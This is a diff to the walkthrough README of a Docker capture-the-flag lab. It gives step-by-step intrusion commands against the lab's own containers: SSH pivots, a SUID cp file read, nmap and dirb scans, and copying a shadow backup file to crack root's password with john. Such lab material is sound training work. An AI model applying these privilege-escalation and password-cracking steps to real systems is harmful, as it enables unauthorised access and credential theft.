@@ -1,5 +1,5 @@
 
-kstepxi//sloth333 Challenge 3
+kstepxi//sloth333 Challenge 3 - Extended Version
 
 
 docker-compose up -d --build
@@ -91,6 +91,8 @@ PART 2
 
 Part2
 
+Part2
+
 1.  ssh to ubuntu1, look for flag5
 	ex:  ssh spike@localhost -p 3210
 2.  flag5 is in /home/root but the directory cannot be listed due to permissions
@@ -100,11 +102,11 @@ Part2
 	ex: chown test /home/root
 5.  viewing flag5 tells us 172.16.88.87 is listening on 4321.  use nc to connect to ubuntu2, receive ssh creds
 	ex: nc 172.16.88.87 4321
-	***note: this only works once!  the port is bound will refuse additional connections
+	***note: this only works once!  the port will refuse additional connections until the container is restarted
 6.  ssh to ubuntu2 and look for flag6.  It is hidden file in /tmp
 	ex: ls -R / 2>/dev/null | grep *flag
 	    ls -R / 2>/dev/null | grep .*
-7.  flag2 has credentials and mentions another box - nmap the subnet
+7.  flag6 has credentials and mentions another box - nmap the subnet
 	ex: nmap 172.16.88.0/24
 8.  ssh to 172.16.88.99 and look for flag7.  Hint points towards finding a useful script (located in /usr/bin)
 	ex: ls /usr/bin
@@ -114,7 +116,25 @@ Part2
 10. cp seems to have the suid bit set and can be used to read the script which reveals the contents of flag7!
 	ex: LFILE=/usr/bin/flag_write.sh
 	    cp "$LFILE" /dev/stdout
+11. flag7 says a webserver is accessible through your localhost on port 9331.  when you navigate to the page
+	it mentions dirb--maybe something interesting is discoverable using dirb?
+	(kali1 has dirb installed and includes a modified default wordlist)
+	ex: dirb http://172.16.88.113
+12. dirb showed there was a file called "pass" that may be accessible.  try it and see what you get!
+	ex: http://localhost:9331/pass
+13. the result is some ssh credentials and a tip that ssh is exposed through localhost 9339.
+	ex: ssh ein@localhost -p 9339
+14. the web server has a hint in ein's home directory telling you that you need root to find the flag.
+	poking around the file system will yield the hidden file /tmp/.shadow.bak
+	ex: ls -al /tmp
+15. looks like it is time to try to crack root's password.  conveniently the kali1 machine has john installed
+	(and a modified password.lst file as well).  transfer the file over to the kali1 box and have a go at it
+	ex: scp /tmp/.shadow.bak faye@172.16.88.99:/home/faye/shadow
+	    john shadow
+16. with the root password cracked, time to switch to root and poke around the file system some more.
+	flag8 is located in /home/root
 
+Congrats! See you Space Cowboy...
 
 
 
